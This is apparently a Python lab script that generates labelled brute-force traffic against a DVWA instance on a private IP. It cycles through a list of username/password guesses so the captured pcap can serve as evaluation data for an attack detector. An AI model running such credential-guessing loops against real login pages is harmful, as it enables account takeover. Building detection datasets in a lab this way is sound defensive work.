import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS BRUTE FORCE EVALUACION MEDIUM
# DISTINTOS a evaluacion_brute.py (low) Y
# DISTINTOS a entrenamiento_brute_medium.py (medium)
# =============================================

PAYLOADS_BRUTE_EVAL_MEDIUM = [
    ("admin", "thunder"),
    ("admin", "lightning"),
    ("admin", "storm"),
    ("admin", "tornado"),
    ("admin", "hurricane"),
    ("admin", "cyclone"),
    ("admin", "blizzard"),
    ("admin", "avalanche"),
    ("admin", "volcano"),
    ("admin", "earthquake"),
    ("admin", "tsunami"),
    ("admin", "meteor"),
    ("admin", "comet"),
    ("admin", "galaxy"),
    ("admin", "nebula"),
    ("admin", "pulsar"),
    ("admin", "quasar"),
    ("admin", "neutron"),
    ("admin", "proton"),
    ("admin", "electron"),
    ("developer", "developer"),
    ("developer", "password"),
    ("developer", "dev123"),
    ("devops", "devops"),
    ("devops", "password"),
    ("sysadmin", "sysadmin"),
    ("sysadmin", "password"),
    ("netadmin", "netadmin"),
    ("dbadmin", "dbadmin"),
    ("secadmin", "secadmin"),
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_brute_eval_medium(session):
    print("\n[*] Iniciando ataques Brute Force MEDIUM (evaluacion)...")
    payloads = PAYLOADS_BRUTE_EVAL_MEDIUM.copy()
    random.shuffle(payloads)
    ok = 0
    for usuario, contrasena in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/brute/",
                            params={"username": usuario, "password": contrasena, "Login": "Login"})
            resultado = "EXITO" if "Welcome" in r.text else "fallo"
            print(f"  BRUTE_EVAL_M | {usuario}:{contrasena:<20} | {resultado} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] Brute Force Medium evaluacion completado: {ok}/{len(payloads)} peticiones")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  EVALUACION: BRUTE FORCE — NIVEL MEDIUM")
    print("  Etiqueta real: 'brute'")
    print("  !! NO subir el pcap a Elasticsearch !!")
    print("  Guardarlo como: evaluacion_brute_medium.pcap")
    print("  AVISO: Asegurate de que DVWA esta en nivel MEDIUM")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_brute_eval_medium(session)

    print("\n" + "="*60)
    print("  COMPLETADO. Guarda el pcap como: evaluacion_brute_medium.pcap")
    print("="*60)
